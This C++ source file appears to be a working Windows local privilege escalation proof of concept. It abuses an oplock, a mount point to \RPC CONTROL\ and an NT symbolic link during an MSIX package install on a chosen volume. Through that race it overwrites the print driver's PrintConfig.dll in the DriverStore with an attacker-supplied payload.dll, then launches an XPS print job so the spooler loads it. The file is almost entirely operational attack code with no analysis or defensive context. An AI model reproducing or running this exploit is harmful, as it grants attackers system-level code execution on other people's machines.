#include "stdafx.h"
#include "ReparsePoint.h"
#include "FileOpLock.h"
#include <iostream>
#include <conio.h>
#include <wchar.h>
#include <stdio.h>
#include "ntimports.h"
#include "CommonUtils.h"
#include <AclAPI.h>
#include <Shlobj.h>//for SHCreateDirectory
#include <sddl.h>//for ConvertSidToStringSidW
#include <PathCch.h>
#include <xpsobjectmodel.h>
#include <xpsprint.h>
#pragma comment(lib, "PathCch.lib")
#pragma comment(lib, "xpsprint.lib") 
#pragma warning( disable : 4995 )
#pragma warning(disable : 4996) //silence some compiler warning
#define FULL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE
using std::cout;
using std::endl;
using std::cin;
using std::wcout;
using std::wstring;
using std::string;
HANDLE nw;
wstring drv;
HANDLE yes;
bool MoveByHandle(HANDLE hfile, const wchar_t* Renamed) {
	auto destFilenameLength = wcslen(Renamed);
	auto bufferSize = sizeof(FILE_RENAME_INFO) + (destFilenameLength * sizeof(wchar_t));
	auto buffer = _malloca(bufferSize);
	memset(buffer, 0, bufferSize);
	auto const fri = reinterpret_cast<FILE_RENAME_INFO*>(buffer);
	fri->ReplaceIfExists = TRUE;
	fri->FileNameLength = destFilenameLength;
	wmemcpy(fri->FileName, Renamed, destFilenameLength);
	if (!SetFileInformationByHandle(hfile, FileRenameInfo, fri, bufferSize))
	{
		return 0;
	}
	else
		return 1;
}
bool MoveToTempDir(HANDLE h) {
	WCHAR f[MAX_PATH];
	GetTempFileName(drv.c_str(), L"hehe", NULL, f);
	DeleteFile(f);
	return MoveByHandle(h, f);
}
void remove_dir(const wchar_t* folder)
{
	std::wstring search_path = std::wstring(folder) + _T("/*.*");
	std::wstring s_p = std::wstring(folder) + _T("/");
	WIN32_FIND_DATA fd;
	HANDLE hFind = ::FindFirstFile(search_path.c_str(), &fd);
	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) || (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)) {
				if (wcscmp(fd.cFileName, _T(".")) != 0 && wcscmp(fd.cFileName, _T("..")) != 0)
				{
					remove_dir((wchar_t*)(s_p + fd.cFileName).c_str());
				}
			}
			else {
				DeleteFile((s_p + fd.cFileName).c_str());
			}
		} while (::FindNextFile(hFind, &fd));
		::FindClose(hFind);
		int d = _wrmdir(folder);
	}
}
HANDLE CreateSymlink(HANDLE root, LPCWSTR linkname, LPCWSTR targetname)
{
	DEFINE_NTDLL(RtlInitUnicodeString);
	DEFINE_NTDLL(NtCreateSymbolicLinkObject);

	OBJECT_ATTRIBUTES objAttr;
	UNICODE_STRING name;
	UNICODE_STRING target;

	fRtlInitUnicodeString(&name, linkname);
	fRtlInitUnicodeString(&target, targetname);

	InitializeObjectAttributes(&objAttr, &name, OBJ_CASE_INSENSITIVE, root, nullptr);

	HANDLE hLink;

	NTSTATUS status = fNtCreateSymbolicLinkObject(&hLink,
		SYMBOLIC_LINK_ALL_ACCESS, &objAttr, &target);
	if (status == 0)
	{
		//DebugPrintf("Opened Link %ls -> %ls: %p\n", linkname, targetname, hLink);
		return hLink;
	}
	else
	{
		SetLastError(NtStatusToDosError(status));
		return nullptr;
	}
}
std::wstring GetUserStringSid(HANDLE htoken = GetCurrentProcessToken()) {
	if (htoken == INVALID_HANDLE_VALUE) {
		return L"";
	}
	TOKEN_USER* token = (TOKEN_USER*)malloc(TOKEN_USER_MAX_SIZE);
	DWORD ret = 0;
	GetTokenInformation(htoken, TokenUser, token, sizeof(token) * 100, &ret);

	SID* user = (SID*)token->User.Sid;
	LPTSTR wsid;
	ConvertSidToStringSidW(user, &wsid);
	return std::wstring(wsid);
}
void cb(){
	wstring wpsys = drv + L"WpSystem";
	wstring wpsi = wpsys + L"\\" + GetUserStringSid();
	MoveToTempDir(nw);
	WCHAR f[MAX_PATH];
	GetTempFileName(drv.c_str(), L"hehe", NULL, f);
	DeleteFile(f);
	MoveFileEx(wpsys.c_str(), f,MOVEFILE_REPLACE_EXISTING);
	CreateDirectory(wpsys.c_str(),0);
	yes = CreateFile(wpsys.c_str(), GENERIC_READ | GENERIC_WRITE | WRITE_DAC, 
		FULL_SHARING, 0, OPEN_ALWAYS,
		FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_OVERLAPPED, 0);
	ReparsePoint::CreateMountPoint(yes, L"\\RPC CONTROL\\", L"");
}

int wmain(int argc, const wchar_t* argv[]) {
	//usage poc.exe [Target Drive]
	if (argc != 2) {
		return 1;
	}
	drv = argv[1];
	if (GetDriveType(argv[1]) != DRIVE_FIXED) {
		return 0;
	}
	Wow64EnableWow64FsRedirection(FALSE);
	wchar_t sysdir[MAX_PATH];
	GetSystemDirectory(sysdir, MAX_PATH);
	wstring drvstore = sysdir + wstring(L"\\DriverStore\\FileRepository\\");
	wstring searchpath = drvstore + L"\\prnms003.inf_amd64_*";
	WIN32_FIND_DATA data = { 0 };
	HANDLE hsearch = FindFirstFile(searchpath.c_str(), &data);
	if (hsearch == INVALID_HANDLE_VALUE) {
		return 0;
	}	system("start ms-settings:storagesense");//run storage settings
	cout << "Press Enter To Continue" << endl;
	_getch();
	wstring payload = drvstore + data.cFileName + L"\\Amd64\\PrintConfig.dll";
	wstring sm = L"\\??\\" + payload;
	wstring sm2cr = L"\\RPC CONTROL\\" + GetUserStringSid();
	HANDLE hsm = CreateSymlink(NULL, sm2cr.c_str(), sm.c_str());
	wstring wpsys = drv + L"WpSystem";
	wstring wpsi = wpsys + L"\\" + GetUserStringSid();
	SHCreateDirectory(0, wpsi.c_str());

	nw = CreateFile(wpsi.c_str(), GENERIC_READ | DELETE, 0, 0, OPEN_ALWAYS,
		FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_OVERLAPPED, 0);
	FileOpLock* lk = FileOpLock::CreateLock(nw, cb);
	/// install the msix package in the target volume
	wstring command = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Add-AppxPackage -Path ";
	wchar_t exedir[MAX_PATH];
	GetModuleFileName(NULL, exedir, MAX_PATH);
	PathCchRemoveFileSpec(exedir, MAX_PATH);
	wstring package = exedir;
	package.append(L"\\Exploit_App.msix");
	package = L"\"" + package + L"\" -Volume ";
	command.append(package);
	command.append(argv[1]);
	
	_wsystem(command.c_str());
	// installation end
	// wait for the oplock to trigger
	lk->WaitForLock(INFINITE);
	// Cleanup
	Sleep(1000);
	SetSecurityInfo(yes, SE_FILE_OBJECT, PROTECTED_DACL_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, NULL,
		NULL, NULL, NULL);
	CloseHandle(yes);
	_wrmdir(wpsys.c_str());
	//payload execution
	wstring ppath = exedir;
	ppath.append(L"\\payload.dll");//payload to execute
	CopyFile(ppath.c_str(), payload.c_str(), FALSE);
	CoInitialize(nullptr);
	IXpsOMObjectFactory* xpsFactory = NULL;
	CoCreateInstance(__uuidof(XpsOMObjectFactory), NULL, CLSCTX_INPROC_SERVER, __uuidof(IXpsOMObjectFactory), reinterpret_cast<LPVOID*>(&xpsFactory));
	HANDLE completionEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	IXpsPrintJob* job = NULL;
	IXpsPrintJobStream* jobStream = NULL;
	StartXpsPrintJob(L"Microsoft XPS Document Writer", L"Print Job 1", NULL, NULL, completionEvent, NULL, 0, &job, &jobStream, NULL);
	jobStream->Close();
	CoUninitialize();
	return 0;
}